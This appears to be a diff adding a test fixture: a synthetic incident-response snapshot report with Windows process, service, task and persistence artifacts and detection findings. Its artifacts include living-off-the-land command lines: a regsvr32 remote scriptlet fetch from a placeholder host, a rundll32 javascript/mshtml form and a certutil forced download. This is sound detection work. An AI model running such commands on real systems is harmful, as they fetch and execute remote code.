+  &#34;created_at&#34;: &#34;2026-09-17T14:00:08Z&#34;
+}</pre></details><details id="artifact-00000000-0000-0000-0000-0000000005a2"><summary>processes · 00000000-0000-0000-0000-0000000005a2</summary><pre>{
+  &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-0000000005a2&#34;,
+  &#34;observed_at&#34;: &#34;2026-09-17T14:05:00Z&#34;,
+  &#34;collector&#34;: &#34;processes&#34;,
+  &#34;pid&#34;: 442,
+  &#34;ppid&#34;: 400,
+  &#34;name&#34;: &#34;regsvr32.exe&#34;,
+  &#34;executable&#34;: &#34;C:\\Windows\\System32\\regsvr32.exe&#34;,
+  &#34;command_line&#34;: [
+    &#34;C:\\Windows\\System32\\regsvr32.exe&#34;,
+    &#34;/s&#34;,
+    &#34;/n&#34;,
+    &#34;/u&#34;,
+    &#34;/i:https://scripts.example.invalid/example.sct&#34;,
+    &#34;scrobj.dll&#34;
+  ],
+  &#34;username&#34;: &#34;EXAMPLE-LAB\\ExampleUser&#34;,
+  &#34;created_at&#34;: &#34;2026-09-17T14:00:09Z&#34;
+}</pre></details><h3>network · 0 items</h3><p>No network evidence available. Source status: <strong>failed</strong>. <a href="#coverage-network">Review network coverage and limits</a>.</p><h3>users · 1 items</h3><details id="artifact-00000000-0000-0000-0000-000000000004"><summary>users · 00000000-0000-0000-0000-000000000004</summary><pre>{
+  &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000004&#34;,
+  &#34;observed_at&#34;: &#34;2026-09-17T14:05:00Z&#34;,
+  &#34;collector&#34;: &#34;users&#34;,
+  &#34;name&#34;: &#34;ExampleUser&#34;,
+  &#34;domain&#34;: &#34;EXAMPLE-LAB&#34;,
+  &#34;sid&#34;: &#34;S-1-5-21-100-200-300-1001&#34;,
+  &#34;source&#34;: &#34;current_token&#34;,
+  &#34;enabled&#34;: true,
+  &#34;session_name&#34;: null,
+  &#34;logged_in_at&#34;: null,
+  &#34;member_of_sid&#34;: null
+}</pre></details><h3>services · 1 items</h3><details id="artifact-00000000-0000-0000-0000-000000000005"><summary>services · 00000000-0000-0000-0000-000000000005</summary><pre>{
+  &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000005&#34;,
+  &#34;observed_at&#34;: &#34;2026-09-17T14:05:00Z&#34;,
+  &#34;collector&#34;: &#34;services&#34;,
+  &#34;name&#34;: &#34;ExampleService&#34;,
+  &#34;display_name&#34;: &#34;Synthetic example service&#34;,
+  &#34;status&#34;: &#34;stopped&#34;,
+  &#34;command&#34;: &#34;\&#34;C:\\Users\\ExampleUser\\AppData\\Local\\ExampleVendor\\example-service.exe\&#34; --synthetic&#34;,
+  &#34;startup_type&#34;: &#34;automatic&#34;,
+  &#34;username&#34;: &#34;LocalSystem&#34;,
+  &#34;pid&#34;: null
+}</pre></details><h3>scheduled_tasks · 1 items</h3><details id="artifact-00000000-0000-0000-0000-000000000006"><summary>scheduled_tasks · 00000000-0000-0000-0000-000000000006</summary><pre>{
+  &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000006&#34;,
+  &#34;observed_at&#34;: &#34;2026-09-17T14:05:00Z&#34;,
+  &#34;collector&#34;: &#34;scheduled_tasks&#34;,
+  &#34;name&#34;: &#34;ExampleTask&#34;,
+  &#34;task_path&#34;: &#34;\\Examples\\&#34;,
+  &#34;state&#34;: &#34;Disabled&#34;,
+  &#34;enabled&#34;: false,
+  &#34;principal&#34;: &#34;ExampleUser&#34;,
+  &#34;actions&#34;: [
+    {
+      &#34;kind&#34;: &#34;exec&#34;,
+      &#34;executable&#34;: &#34;C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\scheduled.exe&#34;,
+      &#34;arguments&#34;: &#34;--synthetic&#34;,
+      &#34;working_directory&#34;: null,
+      &#34;class_id&#34;: null
+    },
+    {
+      &#34;kind&#34;: &#34;exec&#34;,
+      &#34;executable&#34;: &#34;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&#34;,
+      &#34;arguments&#34;: &#34;-NoProfile -File \&#34;C:\\Users\\ExampleUser\\AppData\\Local\\Temp\\example script.ps1\&#34;&#34;,
+      &#34;working_directory&#34;: null,
+      &#34;class_id&#34;: null
+    }
+  ],
+  &#34;triggers&#34;: [
+    {
+      &#34;kind&#34;: &#34;time&#34;,
+      &#34;enabled&#34;: false,
+      &#34;start_boundary_raw&#34;: &#34;2026-09-18T12:00:00&#34;,
+      &#34;end_boundary_raw&#34;: null,
+      &#34;start_at&#34;: null,
+      &#34;end_at&#34;: null,
+      &#34;user_id&#34;: null,
+      &#34;repetition_interval&#34;: null
+    }
+  ]
+}</pre></details><h3>persistence · 3 items</h3><details id="artifact-00000000-0000-0000-0000-000000000007"><summary>persistence · 00000000-0000-0000-0000-000000000007</summary><pre>{
+  &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000007&#34;,
+  &#34;observed_at&#34;: &#34;2026-09-17T14:05:00Z&#34;,
+  &#34;collector&#34;: &#34;persistence&#34;,
+  &#34;kind&#34;: &#34;service&#34;,
+  &#34;location&#34;: &#34;Services/ExampleService&#34;,
+  &#34;entry_name&#34;: &#34;ExampleService&#34;,
+  &#34;command&#34;: &#34;\&#34;C:\\Users\\ExampleUser\\AppData\\Local\\ExampleVendor\\example-service.exe\&#34; --synthetic&#34;,
+  &#34;target_path&#34;: null,
+  &#34;owner_sid&#34;: null,
+  &#34;registry_view&#34;: null,
+  &#34;registry_value_type&#34;: null,
+  &#34;enabled&#34;: true,
+  &#34;source_artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000005&#34;,
+  &#34;action_index&#34;: null
+}</pre></details><details id="artifact-00000000-0000-0000-0000-000000000008"><summary>persistence · 00000000-0000-0000-0000-000000000008</summary><pre>{
+  &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000008&#34;,
+  &#34;observed_at&#34;: &#34;2026-09-17T14:05:00Z&#34;,
+  &#34;collector&#34;: &#34;persistence&#34;,
+  &#34;kind&#34;: &#34;run_key&#34;,
+  &#34;location&#34;: &#34;HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run&#34;,
+  &#34;entry_name&#34;: &#34;ExampleStartup&#34;,
+  &#34;command&#34;: &#34;\&#34;%APPDATA%\\ExampleVendor\\startup.exe\&#34; --synthetic&#34;,
+  &#34;target_path&#34;: null,
+  &#34;owner_sid&#34;: &#34;S-1-5-21-100-200-300-1001&#34;,
+  &#34;registry_view&#34;: &#34;64&#34;,
+  &#34;registry_value_type&#34;: &#34;REG_EXPAND_SZ&#34;,
+  &#34;enabled&#34;: true,
+  &#34;source_artifact_id&#34;: null,
+  &#34;action_index&#34;: null
+}</pre></details><details id="artifact-00000000-0000-0000-0000-000000000009"><summary>persistence · 00000000-0000-0000-0000-000000000009</summary><pre>{
+  &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000009&#34;,
+  &#34;observed_at&#34;: &#34;2026-09-17T14:05:00Z&#34;,
+  &#34;collector&#34;: &#34;persistence&#34;,
+  &#34;kind&#34;: &#34;scheduled_task&#34;,
+  &#34;location&#34;: &#34;\\Examples\\ExampleTask&#34;,
+  &#34;entry_name&#34;: &#34;ExampleTask&#34;,
+  &#34;command&#34;: null,
+  &#34;target_path&#34;: &#34;C:\\Users\\ExampleUser\\AppData\\Roaming\\ExampleVendor\\scheduled.exe&#34;,
+  &#34;owner_sid&#34;: null,
+  &#34;registry_view&#34;: null,
+  &#34;registry_value_type&#34;: null,
+  &#34;enabled&#34;: false,
+  &#34;source_artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000006&#34;,
+  &#34;action_index&#34;: 0
+}</pre></details>
+<details><summary>Path interpretation context</summary><pre>{
+  &#34;known_paths&#34;: [
+    {
+      &#34;kind&#34;: &#34;windows&#34;,
+      &#34;path&#34;: &#34;C:\\Windows&#34;,
+      &#34;owner_sid&#34;: null,
+      &#34;source&#34;: &#34;synthetic fixture&#34;
+    },
+    {
+      &#34;kind&#34;: &#34;profile&#34;,
+      &#34;path&#34;: &#34;C:\\Users\\ExampleUser&#34;,
+      &#34;owner_sid&#34;: &#34;S-1-5-21-100-200-300-1001&#34;,
+      &#34;source&#34;: &#34;synthetic fixture&#34;
+    },
+    {
+      &#34;kind&#34;: &#34;appdata&#34;,
+      &#34;path&#34;: &#34;C:\\Users\\ExampleUser\\AppData\\Roaming&#34;,
+      &#34;owner_sid&#34;: &#34;S-1-5-21-100-200-300-1001&#34;,
+      &#34;source&#34;: &#34;synthetic fixture&#34;
+    },
+    {
+      &#34;kind&#34;: &#34;local_appdata&#34;,
+      &#34;path&#34;: &#34;C:\\Users\\ExampleUser\\AppData\\Local&#34;,
+      &#34;owner_sid&#34;: &#34;S-1-5-21-100-200-300-1001&#34;,
+      &#34;source&#34;: &#34;synthetic fixture&#34;
+    },
+    {
+      &#34;kind&#34;: &#34;temp&#34;,
+      &#34;path&#34;: &#34;C:\\Users\\ExampleUser\\AppData\\Local\\Temp&#34;,
+      &#34;owner_sid&#34;: &#34;S-1-5-21-100-200-300-1001&#34;,
+      &#34;source&#34;: &#34;synthetic fixture&#34;
+    }
+  ],
+  &#34;environment&#34;: [
+    {
+      &#34;name&#34;: &#34;SystemRoot&#34;,
+      &#34;value&#34;: &#34;C:\\Windows&#34;,
+      &#34;owner_sid&#34;: null
+    },
+    {
+      &#34;name&#34;: &#34;APPDATA&#34;,
+      &#34;value&#34;: &#34;C:\\Users\\ExampleUser\\AppData\\Roaming&#34;,
+      &#34;owner_sid&#34;: &#34;S-1-5-21-100-200-300-1001&#34;
+    },
+    {
+      &#34;name&#34;: &#34;LOCALAPPDATA&#34;,
+      &#34;value&#34;: &#34;C:\\Users\\ExampleUser\\AppData\\Local&#34;,
+      &#34;owner_sid&#34;: &#34;S-1-5-21-100-200-300-1001&#34;
+    },
+    {
+      &#34;name&#34;: &#34;TEMP&#34;,
+      &#34;value&#34;: &#34;C:\\Users\\ExampleUser\\AppData\\Local\\Temp&#34;,
+      &#34;owner_sid&#34;: &#34;S-1-5-21-100-200-300-1001&#34;
+    }
+  ]
+}</pre></details>
+<details><summary>Complete analysis relationships and metadata</summary><pre>{
+  &#34;schema_version&#34;: &#34;1.0&#34;,
+  &#34;snapshot_id&#34;: &#34;00000000-0000-0000-0000-0000000000c9&#34;,
+  &#34;ruleset_version&#34;: &#34;1.0.0&#34;,
+  &#34;complete&#34;: true,
+  &#34;findings&#34;: [
+    {
+      &#34;finding_id&#34;: &#34;4e656e63-016d-54d9-8eab-8cf38283c92a&#34;,
+      &#34;rule_id&#34;: &#34;IRS-P003&#34;,
+      &#34;title&#34;: &#34;Office spawned PowerShell&#34;,
+      &#34;severity&#34;: &#34;high&#34;,
+      &#34;description&#34;: &#34;A recognized Office basename directly parented a PowerShell host with a temporally consistent link. Legitimate Office automation can do this; basename evidence does not verify the publisher or establish exploitation.&#34;,
+      &#34;artifact_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000582&#34;,
+        &#34;00000000-0000-0000-0000-00000000058c&#34;
+      ],
+      &#34;pids&#34;: [
+        410,
+        420
+      ],
+      &#34;evidence&#34;: [
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000582&#34;,
+          &#34;field&#34;: &#34;parent.created_at&#34;,
+          &#34;value&#34;: &#34;2026-09-17T14:00:01+00:00&#34;,
+          &#34;explanation&#34;: &#34;Captured parent creation time required for a temporally consistent tree link.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000582&#34;,
+          &#34;field&#34;: &#34;parent.executable&#34;,
+          &#34;value&#34;: &#34;C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE&#34;,
+          &#34;explanation&#34;: &#34;Captured parent identity used for case-insensitive basename matching.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-00000000058c&#34;,
+          &#34;field&#34;: &#34;child.created_at&#34;,
+          &#34;value&#34;: &#34;2026-09-17T14:00:02+00:00&#34;,
+          &#34;explanation&#34;: &#34;Captured child creation time required for a temporally consistent tree link.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-00000000058c&#34;,
+          &#34;field&#34;: &#34;child.executable&#34;,
+          &#34;value&#34;: &#34;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&#34;,
+          &#34;explanation&#34;: &#34;Captured direct-child identity used for basename matching.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-00000000058c&#34;,
+          &#34;field&#34;: &#34;relationship&#34;,
+          &#34;value&#34;: &#34;direct child of PID 410&#34;,
+          &#34;explanation&#34;: &#34;The deterministic tree linked both collected records directly.&#34;
+        }
+      ],
+      &#34;mitre_technique&#34;: null
+    },
+    {
+      &#34;finding_id&#34;: &#34;88ddbb83-0acb-5b9c-9010-e917391a380c&#34;,
+      &#34;rule_id&#34;: &#34;IRS-P005&#34;,
+      &#34;title&#34;: &#34;Office spawned script host&#34;,
+      &#34;severity&#34;: &#34;high&#34;,
+      &#34;description&#34;: &#34;A recognized Office basename directly parented a Windows script host with a temporally consistent link. Legitimate scripted workflows exist; basename evidence does not verify the publisher or characterize script contents.&#34;,
+      &#34;artifact_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000582&#34;,
+        &#34;00000000-0000-0000-0000-00000000058e&#34;
+      ],
+      &#34;pids&#34;: [
+        410,
+        422
+      ],
+      &#34;evidence&#34;: [
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000582&#34;,
+          &#34;field&#34;: &#34;parent.created_at&#34;,
+          &#34;value&#34;: &#34;2026-09-17T14:00:01+00:00&#34;,
+          &#34;explanation&#34;: &#34;Captured parent creation time required for a temporally consistent tree link.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000582&#34;,
+          &#34;field&#34;: &#34;parent.executable&#34;,
+          &#34;value&#34;: &#34;C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE&#34;,
+          &#34;explanation&#34;: &#34;Captured parent identity used for case-insensitive basename matching.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-00000000058e&#34;,
+          &#34;field&#34;: &#34;child.created_at&#34;,
+          &#34;value&#34;: &#34;2026-09-17T14:00:04+00:00&#34;,
+          &#34;explanation&#34;: &#34;Captured child creation time required for a temporally consistent tree link.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-00000000058e&#34;,
+          &#34;field&#34;: &#34;child.executable&#34;,
+          &#34;value&#34;: &#34;C:\\Windows\\System32\\wscript.exe&#34;,
+          &#34;explanation&#34;: &#34;Captured direct-child identity used for basename matching.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-00000000058e&#34;,
+          &#34;field&#34;: &#34;relationship&#34;,
+          &#34;value&#34;: &#34;direct child of PID 410&#34;,
+          &#34;explanation&#34;: &#34;The deterministic tree linked both collected records directly.&#34;
+        }
+      ],
+      &#34;mitre_technique&#34;: null
+    },
+    {
+      &#34;finding_id&#34;: &#34;3a4512c4-5fe0-5eb3-bd68-64a17fab0bba&#34;,
+      &#34;rule_id&#34;: &#34;IRS-P009&#34;,
+      &#34;title&#34;: &#34;Rundll32 JavaScript/mshtml form&#34;,
+      &#34;severity&#34;: &#34;high&#34;,
+      &#34;description&#34;: &#34;Rundll32 used an explicit JavaScript/mshtml RunHTMLApplication form. This rule does not match a normal DLL/export invocation and does not interpret or execute the later script data.&#34;,
+      &#34;artifact_ids&#34;: [
+        &#34;00000000-0000-0000-0000-0000000005a1&#34;
+      ],
+      &#34;pids&#34;: [
+        441
+      ],
+      &#34;evidence&#34;: [
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-0000000005a1&#34;,
+          &#34;field&#34;: &#34;command_line&#34;,
+          &#34;value&#34;: [
+            &#34;C:\\Windows\\System32\\rundll32.exe&#34;,
+            &#34;javascript:\&#34;..\\mshtml,RunHTMLApplication\&#34;;/* inert synthetic marker */&#34;
+          ],
+          &#34;explanation&#34;: &#34;Captured argv tokens preserved as evidence; no token was executed.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-0000000005a1&#34;,
+          &#34;field&#34;: &#34;executable&#34;,
+          &#34;value&#34;: &#34;C:\\Windows\\System32\\rundll32.exe&#34;,
+          &#34;explanation&#34;: &#34;Captured executable path; it is not a publisher or signature assertion.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-0000000005a1&#34;,
+          &#34;field&#34;: &#34;script_pattern&#34;,
+          &#34;value&#34;: &#34;javascript:\&#34;..\\mshtml,RunHTMLApplication\&#34;;/* inert synthetic marker */&#34;,
+          &#34;explanation&#34;: &#34;The explicit script-oriented pattern occupies argv index 1.&#34;
+        }
+      ],
+      &#34;mitre_technique&#34;: null
+    },
+    {
+      &#34;finding_id&#34;: &#34;87bd0b77-ac59-539a-a23f-7319bc845375&#34;,
+      &#34;rule_id&#34;: &#34;IRS-P010&#34;,
+      &#34;title&#34;: &#34;Regsvr32 remote scriptlet form&#34;,
+      &#34;severity&#34;: &#34;high&#34;,
+      &#34;description&#34;: &#34;Regsvr32 combined a remote /i: argument with scrobj.dll. Normal local component registration does not satisfy this form; the evidence still does not prove execution.&#34;,
+      &#34;artifact_ids&#34;: [
+        &#34;00000000-0000-0000-0000-0000000005a2&#34;
+      ],
+      &#34;pids&#34;: [
+        442
+      ],
+      &#34;evidence&#34;: [
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-0000000005a2&#34;,
+          &#34;field&#34;: &#34;scriptlet_target&#34;,
+          &#34;value&#34;: &#34;scrobj.dll&#34;,
+          &#34;explanation&#34;: &#34;A separate target token has the exact Windows basename scrobj.dll.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-0000000005a2&#34;,
+          &#34;field&#34;: &#34;command_line&#34;,
+          &#34;value&#34;: [
+            &#34;C:\\Windows\\System32\\regsvr32.exe&#34;,
+            &#34;/s&#34;,
+            &#34;/n&#34;,
+            &#34;/u&#34;,
+            &#34;/i:https://scripts.example.invalid/example.sct&#34;,
+            &#34;scrobj.dll&#34;
+          ],
+          &#34;explanation&#34;: &#34;Captured argv tokens preserved as evidence; no token was executed.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-0000000005a2&#34;,
+          &#34;field&#34;: &#34;executable&#34;,
+          &#34;value&#34;: &#34;C:\\Windows\\System32\\regsvr32.exe&#34;,
+          &#34;explanation&#34;: &#34;Captured executable path; it is not a publisher or signature assertion.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-0000000005a2&#34;,
+          &#34;field&#34;: &#34;remote_install_argument&#34;,
+          &#34;value&#34;: &#34;/i:https://scripts.example.invalid/example.sct&#34;,
+          &#34;explanation&#34;: &#34;Inline /i: argument contains a standalone HTTP(S) value.&#34;
+        }
+      ],
+      &#34;mitre_technique&#34;: null
+    },
+    {
+      &#34;finding_id&#34;: &#34;82825a4d-5611-5247-b235-e3fcfce02a85&#34;,
+      &#34;rule_id&#34;: &#34;IRS-R003&#34;,
+      &#34;title&#34;: &#34;Service executable in a user-writable directory&#34;,
+      &#34;severity&#34;: &#34;high&#34;,
+      &#34;description&#34;: &#34;A service command&#39;s explicit executable is in a conventional user-writable location identified from captured roots. This lexical heuristic does not establish an exploitable ACL or malicious service; development tools and per-user service software are plausible benign explanations.&#34;,
+      &#34;artifact_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000005&#34;
+      ],
+      &#34;pids&#34;: [],
+      &#34;evidence&#34;: [
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000005&#34;,
+          &#34;field&#34;: &#34;username&#34;,
+          &#34;value&#34;: &#34;LocalSystem&#34;,
+          &#34;explanation&#34;: &#34;Captured service account name; no SID or privilege is inferred.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000005&#34;,
+          &#34;field&#34;: &#34;name&#34;,
+          &#34;value&#34;: &#34;ExampleService&#34;,
+          &#34;explanation&#34;: &#34;Captured service name.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000005&#34;,
+          &#34;field&#34;: &#34;startup_type&#34;,
+          &#34;value&#34;: &#34;automatic&#34;,
+          &#34;explanation&#34;: &#34;Captured service startup type.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000005&#34;,
+          &#34;field&#34;: &#34;status&#34;,
+          &#34;value&#34;: &#34;stopped&#34;,
+          &#34;explanation&#34;: &#34;Captured service status; it is not installation-time evidence.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000005&#34;,
+          &#34;field&#34;: &#34;path_basis&#34;,
+          &#34;value&#34;: &#34;The normalized path is within a captured local_appdata root; this is a lexical location hint, not an ACL or trust decision.&#34;,
+          &#34;explanation&#34;: &#34;Lexical comparison against captured endpoint roots; this is not an ACL, publisher, or trust conclusion.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000005&#34;,
+          &#34;field&#34;: &#34;command&#34;,
+          &#34;value&#34;: &#34;\&#34;C:\\Users\\ExampleUser\\AppData\\Local\\ExampleVendor\\example-service.exe\&#34; --synthetic&#34;,
+          &#34;explanation&#34;: &#34;Original service command; it was not executed or rewritten.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000005&#34;,
+          &#34;field&#34;: &#34;interpreted_target&#34;,
+          &#34;value&#34;: &#34;C:\\Users\\ExampleUser\\AppData\\Local\\ExampleVendor\\example-service.exe&#34;,
+          &#34;explanation&#34;: &#34;The explicit executable or supported script target retained from evidence.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000005&#34;,
+          &#34;field&#34;: &#34;target_provenance&#34;,
+          &#34;value&#34;: &#34;raw_command_executable&#34;,
+          &#34;explanation&#34;: &#34;The parser records how the target was obtained without executing it.&#34;
+        }
+      ],
+      &#34;mitre_technique&#34;: null
+    },
+    {
+      &#34;finding_id&#34;: &#34;9b3adc97-9c46-55d7-82d8-bf20872ce78a&#34;,
+      &#34;rule_id&#34;: &#34;IRS-P004&#34;,
+      &#34;title&#34;: &#34;Office spawned command shell&#34;,
+      &#34;severity&#34;: &#34;medium&#34;,
+      &#34;description&#34;: &#34;A recognized Office basename directly parented cmd.exe with a temporally consistent link. Legitimate Office automation can launch a shell; basename evidence does not verify the publisher or establish exploitation.&#34;,
+      &#34;artifact_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000582&#34;,
+        &#34;00000000-0000-0000-0000-00000000058d&#34;
+      ],
+      &#34;pids&#34;: [
+        410,
+        421
+      ],
+      &#34;evidence&#34;: [
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000582&#34;,
+          &#34;field&#34;: &#34;parent.created_at&#34;,
+          &#34;value&#34;: &#34;2026-09-17T14:00:01+00:00&#34;,
+          &#34;explanation&#34;: &#34;Captured parent creation time required for a temporally consistent tree link.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000582&#34;,
+          &#34;field&#34;: &#34;parent.executable&#34;,
+          &#34;value&#34;: &#34;C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE&#34;,
+          &#34;explanation&#34;: &#34;Captured parent identity used for case-insensitive basename matching.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-00000000058d&#34;,
+          &#34;field&#34;: &#34;child.created_at&#34;,
+          &#34;value&#34;: &#34;2026-09-17T14:00:03+00:00&#34;,
+          &#34;explanation&#34;: &#34;Captured child creation time required for a temporally consistent tree link.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-00000000058d&#34;,
+          &#34;field&#34;: &#34;child.executable&#34;,
+          &#34;value&#34;: &#34;C:\\Windows\\System32\\cmd.exe&#34;,
+          &#34;explanation&#34;: &#34;Captured direct-child identity used for basename matching.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-00000000058d&#34;,
+          &#34;field&#34;: &#34;relationship&#34;,
+          &#34;value&#34;: &#34;direct child of PID 410&#34;,
+          &#34;explanation&#34;: &#34;The deterministic tree linked both collected records directly.&#34;
+        }
+      ],
+      &#34;mitre_technique&#34;: null
+    },
+    {
+      &#34;finding_id&#34;: &#34;3f9c0ab6-6e28-5afd-854a-6e6746f658c4&#34;,
+      &#34;rule_id&#34;: &#34;IRS-P006&#34;,
+      &#34;title&#34;: &#34;Process executable in TEMP&#34;,
+      &#34;severity&#34;: &#34;medium&#34;,
+      &#34;description&#34;: &#34;The captured executable path is in an identified TEMP directory. Installers and updaters commonly execute there, so the location warrants review but is not a trust conclusion.&#34;,
+      &#34;artifact_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000596&#34;
+      ],
+      &#34;pids&#34;: [
+        430
+      ],
+      &#34;evidence&#34;: [
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000596&#34;,
+          &#34;field&#34;: &#34;executable&#34;,
+          &#34;value&#34;: &#34;C:\\Users\\ExampleUser\\AppData\\Local\\Temp\\example-installer.exe&#34;,
+          &#34;explanation&#34;: &#34;Captured executable path required by this location rule.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000596&#34;,
+          &#34;field&#34;: &#34;path_basis&#34;,
+          &#34;value&#34;: &#34;The normalized path is within a captured temp root; this is a lexical location hint, not an ACL or trust decision.&#34;,
+          &#34;explanation&#34;: &#34;Classifier basis; this makes no ACL, trust, or existence claim.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000596&#34;,
+          &#34;field&#34;: &#34;normalized_path&#34;,
+          &#34;value&#34;: &#34;c:\\users\\exampleuser\\appdata\\local\\temp\\example-installer.exe&#34;,
+          &#34;explanation&#34;: &#34;Lexically normalized Windows path derived only from captured context.&#34;
+        }
+      ],
+      &#34;mitre_technique&#34;: null
+    },
+    {
+      &#34;finding_id&#34;: &#34;268e5ec8-2180-5764-a0dd-9ba61d980e48&#34;,
+      &#34;rule_id&#34;: &#34;IRS-P008&#34;,
+      &#34;title&#34;: &#34;Certutil remote forced retrieval&#34;,
+      &#34;severity&#34;: &#34;medium&#34;,
+      &#34;description&#34;: &#34;Certutil combined -urlcache and forced retrieval with a standalone HTTP(S) source. Legitimate certificate administration can fetch remote material, so review the source and workflow.&#34;,
+      &#34;artifact_ids&#34;: [
+        &#34;00000000-0000-0000-0000-0000000005a0&#34;
+      ],
+      &#34;pids&#34;: [
+        440
+      ],
+      &#34;evidence&#34;: [
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-0000000005a0&#34;,
+          &#34;field&#34;: &#34;command_line&#34;,
+          &#34;value&#34;: [
+            &#34;C:\\Windows\\System32\\certutil.exe&#34;,
+            &#34;-urlcache&#34;,
+            &#34;-split&#34;,
+            &#34;-f&#34;,
+            &#34;https://downloads.example.invalid/sample.txt&#34;,
+            &#34;C:\\IRSnapshotFixtures\\sample.txt&#34;
+          ],
+          &#34;explanation&#34;: &#34;Captured argv tokens preserved as evidence; no token was executed.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-0000000005a0&#34;,
+          &#34;field&#34;: &#34;executable&#34;,
+          &#34;value&#34;: &#34;C:\\Windows\\System32\\certutil.exe&#34;,
+          &#34;explanation&#34;: &#34;Captured executable path; it is not a publisher or signature assertion.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-0000000005a0&#34;,
+          &#34;field&#34;: &#34;download_options&#34;,
+          &#34;value&#34;: [
+            &#34;-urlcache&#34;,
+            &#34;-split&#34;,
+            &#34;-f&#34;
+          ],
+          &#34;explanation&#34;: &#34;Exact supported certutil option tokens found in captured argv.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-0000000005a0&#34;,
+          &#34;field&#34;: &#34;remote_source&#34;,
+          &#34;value&#34;: &#34;https://downloads.example.invalid/sample.txt&#34;,
+          &#34;explanation&#34;: &#34;Standalone HTTP(S) URLCache positional source after supported no-value flags.&#34;
+        }
+      ],
+      &#34;mitre_technique&#34;: null
+    },
+    {
+      &#34;finding_id&#34;: &#34;3412a101-2845-5107-9935-047196c427e6&#34;,
+      &#34;rule_id&#34;: &#34;IRS-R001&#34;,
+      &#34;title&#34;: &#34;Run-key target in a user-writable directory&#34;,
+      &#34;severity&#34;: &#34;medium&#34;,
+      &#34;description&#34;: &#34;A Run-key command has an explicit executable or supported script target in a conventional user-writable location identified from captured roots. This is a lexical heuristic; legitimate logon software can use the same locations.&#34;,
+      &#34;artifact_ids&#34;: [
+        &#34;00000000-0000-0000-0000-000000000008&#34;
+      ],
+      &#34;pids&#34;: [],
+      &#34;evidence&#34;: [
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000008&#34;,
+          &#34;field&#34;: &#34;entry_name&#34;,
+          &#34;value&#34;: &#34;ExampleStartup&#34;,
+          &#34;explanation&#34;: &#34;Captured Run-key value name.&#34;
+        },
+        {
+          &#34;artifact_id&#34;: &#34;00000000-0000-0000-0000-000000000008&#34;,
